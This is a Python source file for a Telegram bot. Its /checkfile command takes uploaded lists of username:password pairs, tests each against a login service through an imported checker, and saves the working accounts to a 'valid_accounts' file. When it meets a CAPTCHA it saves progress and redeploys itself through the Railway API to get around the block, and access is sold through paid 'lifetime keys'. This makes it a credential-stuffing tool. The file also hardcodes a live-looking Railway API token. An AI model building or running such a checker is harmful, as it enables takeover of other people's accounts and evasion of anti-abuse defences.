import os
import sys
import io
import json
import asyncio
import datetime
import requests
import time
from collections import defaultdict
from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from dotenv import load_dotenv

import main

# Load environment variables
load_dotenv()

# Bot Credentials
API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")

# Supabase Credentials
SUPABASE_URL = os.getenv("SUPABASE_URL")
SUPABASE_SERVICE_ROLE = os.getenv("SUPABASE_SERVICE_ROLE")
SUPABASE_HEADERS = {
    "apikey": SUPABASE_SERVICE_ROLE,
    "Authorization": f"Bearer {SUPABASE_SERVICE_ROLE}",
    "Content-Type": "application/json"
}

ADMIN_ID = int(os.getenv("ADMIN_ID"))

app = Client("my_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

user_pending_files = {}

# ✅ Redeploy Railway using GraphQL API
def trigger_railway_redeploy():
    token = "228d2031-4548-4804-9fdc-32390010c4f5"  # 🔐 Keep this private
    project_id = "2e95dc6d-0e0b-4edd-8c51-5ef47df2fe2c"

    url = "https://backboard.railway.app/graphql/v2"
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }
    payload = {
        "query": """
            mutation Redeploy($projectId: String!) {
              deployProject(input: { projectId: $projectId }) {
                id
              }
            }
        """,
        "variables": {
            "projectId": project_id
        }
    }

    try:
        response = requests.post(url, headers=headers, json=payload)
        print(f"[Railway] Redeploy status: {response.status_code}")
    except Exception as e:
        print(f"[Railway] Failed to redeploy: {e}")

def save_checkpoint(index, file_path):
    with open("checkpoint.json", "w") as f:
        json.dump({"index": index, "file_path": file_path}, f)

def load_checkpoint():
    try:
        with open("checkpoint.json", "r") as f:
            return json.load(f)
    except FileNotFoundError:
        return {"index": 0, "file_path": None}

def has_vip_access(user_id):
    response = requests.get(f"{SUPABASE_URL}/rest/v1/keys?redeemed_by=eq.{user_id}", headers=SUPABASE_HEADERS)
    if response.status_code != 200:
        return False
    data = response.json()
    if not data:
        return False
    expiry_str = data[0].get("expiry")
    if not expiry_str:
        return False
    expiry_date = datetime.datetime.fromisoformat(expiry_str)
    return (expiry_date - datetime.datetime.now(datetime.timezone.utc)).days > 7

def can_use_vip(user_id):
    if user_id == ADMIN_ID:
        return True, None
    if not has_vip_access(user_id):
        return False, "🚫 You need to avail a lifetime key to use this command!"
    return True, None

async def save_file(message):
    file_message = message.reply_to_message if message.reply_to_message and message.reply_to_message.document else message if message.document else None
    if not file_message:
        return None, "🚫 Please send or reply to a file."
    os.makedirs("downloads", exist_ok=True)
    file_path = f"downloads/{file_message.document.file_name}"
    await file_message.download(file_path)
    return file_path, None

@app.on_message(filters.command("checkfile"))
async def check_file(client, message):
    user_id = message.from_user.id

    can_use, error_message = can_use_vip(user_id)
    if not can_use:
        await message.reply(error_message)
        return

    file_path, error = await save_file(message)
    if error:
        await message.reply(error)
        return

    await message.reply("🔍 Running bulk check...")
    await bulk_check(file_path, message)

async def bulk_check(file_path, message):
    user_id = message.from_user.id
    date = main.get_datenow()
    successful_count = 0
    failed_count = 0

    checkpoint = load_checkpoint()
    start_index = checkpoint["index"] if checkpoint["file_path"] == file_path else 0

    if not file_path.endswith('.txt'):
        await message.reply("❌ Error: Provided file is not a .txt file.")
        return

    output_dir = "output"
    os.makedirs(output_dir, exist_ok=True)
    failed_file = os.path.join(output_dir, f"failed_{date}.txt")
    success_file = os.path.join(output_dir, f"valid_accounts_{date}.txt")

    with open(file_path, 'r', encoding='utf-8') as infile, \
         open(failed_file, 'a', encoding='utf-8') as fail_out, \
         open(success_file, 'a', encoding='utf-8') as success_out:

        accounts = infile.readlines()
        await message.reply(f"📋 Loaded {len(accounts)} accounts. Resuming from line {start_index + 1}.")

        for i in range(start_index, len(accounts)):
            acc = accounts[i].strip()

            if ':' not in acc:
                failed_count += 1
                fail_out.write(f"{acc} - Invalid format\n")
                await message.reply(f"❌ {acc} - Invalid format")
                continue

            username, password = acc.rsplit(':', 1)
            sys.stdin = io.StringIO("\n")

            try:
                result = await asyncio.to_thread(main.check_account, username, password, date)
            except RuntimeError as e:
                if "CAPTCHA_DETECTED" in str(e):
                    await message.reply("🛑 CAPTCHA detected! Saving progress and redeploying...")
                    save_checkpoint(i, file_path)
                    trigger_railway_redeploy()
                    os._exit(0)
                else:
                    raise

            if isinstance(result, tuple) and len(result) == 2:
                status, output = result
            else:
                status = "FAILED"
                output = str(result)

            clean = main.strip_ansi_codes_jarell(output)

            if status == "SUCCESS":
                successful_count += 1
                success_out.write(f"{username}:{password} - valid\n")
                await message.reply(clean)
            else:
                failed_count += 1
                fail_out.write(f"{username}:{password} - {clean}\n")
                await message.reply(f"❌ {username}:{password} - {clean}")

            save_checkpoint(i + 1, file_path)

    if os.path.exists("checkpoint.json"):
        os.remove("checkpoint.json")

    await message.reply(
        f"📊 **Bulk Check Summary:**\n"
        f"📋 Total: {len(accounts)}\n"
        f"✅ Success: {successful_count}\n"
        f"❌ Failed: {failed_count}"
    )

app.run()
